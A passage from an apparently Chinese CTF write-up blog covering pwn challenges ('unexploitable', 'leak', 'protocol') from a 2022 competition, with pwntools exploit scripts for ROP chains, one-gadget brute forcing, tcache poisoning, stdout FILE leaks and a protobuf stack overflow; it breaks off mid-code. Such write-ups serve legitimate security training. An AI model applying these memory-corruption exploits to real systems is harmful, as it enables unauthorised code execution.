rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br>orw=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="unexploitable">unexploitable</h2><h3 id="0x01程序分析-2">0x01程序分析</h3><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E4%BF%9D%E6%8A%A4.png" alt="unexp保护"></p><p>保护就canary没开</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E7%A8%8B%E5%BA%8F.png" alt="unexp程序"></p><p>程序就一个read</p><p>这题其实限制的很死了，我们也没啥好的手段，也没法找gadget，只能改改ret的地址</p><h3 id="0x02利用思路-2">0x02利用思路</h3><p>我们想办法要ret到一个libc段的地址再改为og就行</p><p>可以发现read的ret地址离libc_start_main+231差0x10</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A3.png" alt="unexp解"></p><p>我们只要改ret的最后一字节为0xD1，可以rsp-0x10就能ret到libc_start_main+231了</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/unexp%E8%A7%A31.png" alt="unexp解1"></p><p>我们改为og，然后实际有12个位不确定，爆破1/4096概率成功</p><p>（然后这个爆破脚本可能有些问题，本地可行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./unexploitable&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>    payload+=p8(<span class="hljs-number">0xd1</span>)<br>    se(payload)<br>    <span class="hljs-comment">#debug()</span><br>    og=[<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>    se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xfc</span>)+p8(<span class="hljs-number">0xE2</span>)+p8(<span class="hljs-number">0xd6</span>))<br>    sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>    r.recvline_contains(<span class="hljs-string">&#x27;flag&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        r=process(<span class="hljs-string">&#x27;./unexploitable&#x27;</span>)<br>        <span class="hljs-comment">#r=remote(&#x27;39.106.13.71&#x27;,31780)</span><br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="leak">leak</h2><p>这题有必要复现一下，主要参考这位师傅 <a href="https://www.52pojie.cn/thread-1705930-1-1.html#44512750_%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">wp</a></p><h3 id="0x01程序分析-3">0x01程序分析</h3><p>保护全开</p><p>delete中存在uaf</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leak1.png" alt="leak1"></p><p>libc是Ubuntu GLIBC 2.27-3ubuntu1.6，这个版本有doublefree检测，不过我们能uaf改key</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/94%609U5B0$A2UK9K%60N6MZDJ6.png" alt="img"></p><p>这两个函数也没有输出功能，起迷惑作用</p><h3 id="0x02利用思路-3">0x02利用思路</h3><p>我们的最终目标就是打印存在堆中的flag，但是这题没有show功能，如何才能做到呢？</p><p>一般没有show功能的，我们就要打stdout，</p><p>可以改<code>0xfbad1800,0,0,0,b'\x00'</code>，这么改的话，遇到puts或printf函数会打印 IO_write_base 到 IO_write_ptr 俩指针中间的内容，</p><p>虽然程序特意避免使用puts反而用了write，但是我们可以用exit功能来触发IO流，里面就有puts或printf（应该）</p><p>（比赛时没想到用exit😅）</p><p>那我们只要改IO_write_base为flag的堆地址，IO_write_ptr 改合理的地址，exit来触发就行了</p><p>因为无法泄露出libc与heap的地址，我们要tcache poison到指定地址只能靠tcache中fd中残留的堆地址，unsortbin中存的main_arena地址（通过改tcache的fd最后一字节造成堆重叠，改main_arena后两字节指向stdout，要爆破4位1/16概率），并通过堆重叠多次利用同一个堆。</p><p>我们靠tcache poison申请堆到stdout，改IO_write_ptr 为自己定的一个地址0x577777777777</p><p>用fastbin reverse to tcache的手法，改IO_write_base 为tcache的bk，可以是堆基址+0x10</p><p>（fastbin reverse to tcache的攻击效果是往target-0x18处的地址写入对应tcache的bk指针，也就是一个堆地址）</p><p>要满足tachebin有一个为空，这里是0x40有6个</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache1.png" alt="fastbin reverse tcache1"></p><p>接着我们再申请0x40的话会把fastbin中0x40的放到tcache中，然后target处写入了堆地址</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/fastbinreversetcache2.png" alt="fastbin reverse tcache2"></p><h3 id="0x03本地准备">0x03本地准备</h3><p>版本差异，有必要patchelf一下</p><p>用glibc-all-in-one下载这版本，找到配套ld</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/22PNOKOE@AVF@P6K(%25WG%7B)8.png" alt="img"></p><p>接着patchelf</p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.27.so ./leak</code></p><p><code>patchelf --set-interpreter ./ld-2.27.so ./leak</code></p><p>最后我们把gdb的debug文件同名文件夹替换成1.6版本的gdb就能调试堆栈了</p><p><code>sudo rm -rf /usr/lib/debug</code></p><p><code>sudo cp -r ~/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/.debug/ /usr/lib/debug</code></p><h3 id="0x04exp">0x04exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./leak&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#----------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>)<span class="hljs-comment">#victim to overlap</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">0</span>)<br>        edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use fastbin reverse tcache</span><br><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)<span class="hljs-comment">#unsortbin</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">1</span>)<br>        edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use get unsortbin main_arena</span><br><br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0x10</span>))<span class="hljs-comment">#tcache poison to heap 2</span><br><br>    add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-comment">#now overlap 2=9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x41</span>))<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">10</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x51</span>))<br>    delete(<span class="hljs-number">10</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>))<br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe760</span>))<br><br>    add(<span class="hljs-number">11</span>,<span class="hljs-number">0x40</span>)<br>    add(<span class="hljs-number">12</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">12</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x577777777777</span>))<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>))<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe780</span>-<span class="hljs-number">0x18</span>))<br>    add(<span class="hljs-number">13</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">14</span>,<span class="hljs-number">0x30</span>)<br><br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br>    s=rc(<span class="hljs-number">0x50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+s)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./leak&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leakgetshell.png" alt="leakgetshell"></p><h2 id="protocol">protocol</h2><p>没做过这种类型的题，真的是一脸懵逼😨,参考-不知从哪来的一份wp</p><p><strong><a href="https://developers.google.com/protocol-buffers/">Protobuf</a>是由Google开发的一种序列化格式</strong>，用于越来越多的Android，Web，桌面和更多应用程序。它由一种<strong>用于声明数据结构的语言</strong>组成，然后根据目标实现将其编译为代码或另一种结构。</p><h3 id="0x01程序分析：">0x01程序分析：</h3><p>这题是photobuf文件，</p><p>先ida跳转到指定函数，因为去了符号表，加签名文件，可以获得更多信息</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo1.png" alt="photo1"></p><p>发现漏洞存在于这两个strcpy，存在栈溢出</p><p>偏移0x148或0x248</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/@GXH%7D4T65URK%7B7GJQQL%7BMKR.png" alt="img"></p><p>但由于用的是strcpy，遇到\x00会截断，并且在末尾会加上\x00</p><p>程序会一直循环，如果我们要用栈溢出去rop的话可以从后往前构造</p><p>但首先我们得正确与程序进行交互</p><h3 id="0x02安装pbkt">0x02安装pbkt</h3><p>用工具帮助我们逆向</p><blockquote><p>pbtk - 逆向工程Protobuf应用程序</p></blockquote><p>我选择在ubuntu20.04上装</p><p>报了很多错</p><p>最后我更新pip3到最新版本，下面代码openjdk-9我换成openjdk-11，</p><p>git clone我换成去github上下载zip到主机，再解压放到虚拟机里，</p><p>运行./gui.py成功搞定</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/pbkt%E5%AE%89%E8%A3%85.png" alt="pbkt安装"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/marin-m/pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gui.py</span><br></code></pre></td></tr></table></figure><h3 id="0x03得到ctf-proto">0x03得到ctf.proto</h3><p>直接点击step1</p><p>然后选择第一个也就是二进制文件格式的</p><p>找到protocol文件，双击，就有了ctf.proto文件</p><p>我们可以看到，文件存在这个位置</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/ctfproto1.png" alt="ctfproto1"></p><p>我拷贝到桌面</p><p><code>cp -r ./ctf.proto ~/Desktop</code></p><h3 id="0x04protoc编译popto文件">0x04protoc编译popto文件</h3><p>安装谷歌的protoc</p><p><code>sudo apt install python3-protobuf protobuf-compiler libprotobuf17 libprotobuf-dev</code></p><p>输入以下命令，编译出ctf_pb2.py文件</p><p><code>protoc --python_out=./ ./ctf.proto</code></p><p>我们可以引用</p><p><code>import ctf_pb2</code>到脚本中</p><p>它的结构为</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo2.png" alt="photo2"></p><p>可以这么用如下代码使用，用.SerializeToString()方法序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">d=ctf_pb2.pwn()<br>d.username=pd<br>d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>strs=d.SerializeToString()<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br></code></pre></td></tr></table></figure><h3 id="0x05exp">0x05exp</h3><p>大体逻辑就是栈溢出从后往前rop造了execve(bss,0,0) 和read(0,bss,7),写入/bin/sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 